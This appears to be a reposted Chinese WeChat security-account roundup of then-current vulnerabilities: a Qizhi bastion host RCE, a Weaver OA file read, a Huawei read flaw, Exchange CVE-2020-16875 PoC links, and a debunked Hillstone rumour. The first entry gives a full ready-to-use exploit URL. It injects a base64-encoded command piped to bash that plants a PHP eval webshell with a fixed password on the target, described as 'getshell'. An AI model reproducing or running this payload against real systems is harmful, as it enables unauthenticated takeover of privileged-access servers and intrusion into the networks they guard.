\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/1gK\_7-neW6InBKlV1s27JA)

截止到今日：0day 清单

![](https://mmbiz.qpic.cn/mmbiz_png/enXQnPDrqyyRe0yyNXAPn8cPR9uV3ovY7e0icGgVeZ9s1RRjic56CQyRWo0HciamIOt8jp73KHFmHpYZOvvYwhoqg/640?wx_fmt=png)

**齐治堡垒机前台远程命令执行漏洞**

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G57EXGrQmyASmoglFmnrLlQicTkKylUa8urPQDWqPWgIeAJibmibn5Ze9bdqdftGZkrMlOLCNZ7JsNiaA/640?wx_fmt=png)

**漏洞利用：**

利用条件：无需登录：  
第一  

http://10.20.10.11/listener/cluster\_manage.php 返回 “OK”。  
第二，执行以下链接即可 getshell，执行成功后，生成 PHP 一句话马  

/var/www/shterm/resources/qrcode/lbj77.php 密码 10086，使用 BASE64 进行编码。这里假设 10.20.10.10 为堡垒机的 IP 地址。  

```
https://10.20.10.10/ha\_request.php?action=install&ipaddr=10.20.10.11&node\_id=1${I
FS}|\`echo${IFS}"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz
4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64
${IFS}-d|bash\`|${IFS}|echo${IFS}

```

特征：  
漏洞利用点：  

```
https://10.20.10.10/ha\_request.php
Poc 形式：
${IFS}|\`echo${IFS}"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7
Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base
64${IFS}-d|bash\`|${IFS}|echo${IFS}

```

**泛微 OA 云桥任意文件读取漏洞**

利用 / wxjsapi/saveYZJFile 接口获取 filepath, 返回数据包内出现了程序的绝对路径, 攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。  

![](https://mmbiz.qpic.cn/mmbiz_jpg/enXQnPDrqyyRe0yyNXAPn8cPR9uV3ovYayFwlaUOPy86oaSSlkeuff9AGL8MiaYibrqfr8ujJJc8ibppZhHt85szA/640?wx_fmt=jpeg)

**多款 Huawei 产品越界读取漏洞**
======================

![](https://mmbiz.qpic.cn/mmbiz_png/enXQnPDrqyyRe0yyNXAPn8cPR9uV3ovYcBPW1cShO41fJd1ZYtKqUOCicic89B1UcohPI9heibJa1nLAZmPOT1LfA/640?wx_fmt=png)

参考链接：https://www.cnvd.org.cn/flaw/show/CNVD-2020-36735

**Exchange Server 远程代码执行漏洞（POC 未验证）  
**

CVE-2020-16875: Exchange Server 远程代码执行漏洞（202009 月度漏洞）

ps 版 POC：https://srcincite.io/pocs/cve-2020-16875.ps1.txt

py 版 POC：https://srcincite.io/pocs/cve-2020-16875.py.txt

**网传：山石 SG-6000 设备存在漏洞** 

官方辟谣称 该公告并不是指设备本身存在漏洞，而是某个使用山石网科网络安全设备的管理员安全意识不足，配置不当导致，实属于事件型安全漏洞。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnKDh1fj2lChlrBw7l8IUjOq4UpxiaPibovEWdCDsjPkic7aOG8kmjrkEOklCH8aUp1yg98cHaQfaVAiag/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/enXQnPDrqyyRe0yyNXAPn8cPR9uV3ovYoprOT3Sec1y8m9L4rufzDsa3vUFiacp32WHGRkJPlksvjGqvwrcLGMw/640?wx_fmt=png)

参考链接：https://mp.weixin.qq.com/s/lg2ttFSIybginh6KNS-SGQ

禁止非法，后果自负

欢迎关注公众号：web 安全工具库

![](https://mmbiz.qpic.cn/mmbiz_jpg/8H1dCzib3UibuBgB7qfQsvQ51Ak1Z0bcNMyR2JKE1j3kqnBdeIhDdB9icZyhxyLicgFuIghKbGTW6icP8Tpfulo4nuw/640?wx_fmt=jpeg)